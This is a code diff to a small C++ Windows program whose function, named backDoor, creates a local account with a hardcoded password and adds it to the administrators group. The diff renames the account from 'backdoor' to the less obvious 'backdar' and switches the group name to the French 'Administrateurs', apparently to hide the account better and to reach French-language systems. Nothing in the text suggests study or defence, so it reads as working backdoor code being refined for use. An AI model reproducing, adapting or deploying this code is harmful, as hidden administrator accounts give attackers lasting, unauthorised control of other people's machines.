@@ -4,7 +4,7 @@
 #include <LM.h>
 #pragma comment(lib, "Netapi32.lib")
 using namespace std;
-wstring name = L"backdoor";
+wstring name = L"backdar";
 LPWSTR lpName = const_cast<wchar_t *>(name.c_str());
 wstring password = L"localadmin123!";
 LPWSTR lpPassword = const_cast<wchar_t *>(password.c_str());
@@ -29,7 +29,7 @@ int backDoor(USER_INFO_1 userinfo)
 	{
 		return adduserStatus;
 	}
-	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
+	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrateurs").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
 	if (adduserStatus)
 	{
 		return adduserStatus;
